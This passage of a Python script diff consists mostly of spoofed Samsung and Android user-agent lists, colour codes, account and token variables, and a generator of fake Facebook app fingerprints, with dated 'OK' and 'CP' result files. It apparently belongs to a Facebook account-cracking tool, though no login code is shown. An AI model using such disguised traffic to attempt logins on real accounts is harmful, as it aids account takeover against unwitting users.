AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']
+id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]
 cp = 0
-
-#--> Warna
-P = "\x1b[38;5;231m" # Putih
-M = "\x1b[38;5;196m" # Merah
-H = "\x1b[38;5;46m"  # Hijau
-A = '\x1b[38;5;248m' # Abu-Abu
-
-#--> Clear Terminal
+ok = []
+try:
+	os.mkdir('/sdcard/')
+except:pass
+x = '\33[m' 
+k = '\033[93m' 
+h = '\x1b[1;92m' 
+hh = '\033[32m' 
+u = '\033[95m' 
+K = '\033[95m' 
+kk = '\033[33m' 
+b = '\33[1;96m' 
+p = '\x1b[0;34m' 
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;] '
+    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)","Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)","Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)","Dalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c 